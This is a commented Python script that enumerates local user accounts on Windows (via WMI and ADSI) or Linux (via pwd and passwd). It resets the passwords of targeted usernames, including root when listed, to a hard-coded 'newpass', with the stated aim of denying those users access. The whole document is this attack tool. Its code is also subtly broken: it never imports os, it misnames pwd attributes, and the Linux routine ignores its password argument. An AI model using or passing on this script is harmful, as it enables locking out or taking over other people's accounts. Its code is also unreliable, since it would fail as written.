# This script searches a system for target usernames, and changes the password for that name, denying access to the user.
# Needs an Admin cmd-prompt!

import platform
# platform is Python's built-in library to extract information about the system-in-use's platform (e.g. device, OS, Py version, etc.)

def setWindowsPassword(username,password):
    from win32com import adsi
    # This function "adsi" allows passwords to be changed. It seems some Python version name the library pywin32.
    # It interacts with Windows at an API level.
    ads_obj = adsi.ADsGetObject("WinNT://localhost/%s,user"%username)
    ads_obj.Getinfo()
    ads_obj.SetPassword(password)
    # These three commands set Python to interact with the object holding the user's password, and to change it.

def setLinuxPassword(username,password):
    os.system('echo -e "newpass\nnewpass" | passwd %s' % username)
    # newpass is piped twiced to the "passwd" command which changes the password for a specified username.
    # The second pass is for the passwd command's verification step.
    # "-e" allows esape characters to be processed in an echo command, because "\n" is necessary to tell Linux to enter "newpass" on a new line.

def changeCriteria(username):
    if username in ["testuser","user1"]:
        return True
    else:
        return False

if platform.system() == "Windows":
    import wmi
    w = wmi.WMI()
    for user in w.Win32_UserAccount():
        username = user.Name
        if changeCriteria(username):
        # Up to this point, the function has tested if Windows is in use, started an instance of WMI to get usernames in the PC,
        # and tested if any of those usernames are in the target list specified in changeCriteria() (above).
            print("Changing password: %s"%username)
            setWindowsPassword(username,"newpass")
            # If the name was a target, this function (detailed above) changes the password, denying access to the user.
else:
    import pwd
    for p in pwd.getpwall():
    # In Linux, this will give a full list of user accounts on the system.
        if p.pwd_uid == 0 or p.pw_uid > 500:
        # "root" on Linux has ID 0, and in most cases, user accounts have IDs starting over 500.
            username = p.pwd_name
            if changeCriteria(username):
            # As above, this tests for a target username,
                print("Changing password: %s"%username)
                setLinuxPassword(username,"newpass")
                # and changes it, like in the "if" block.
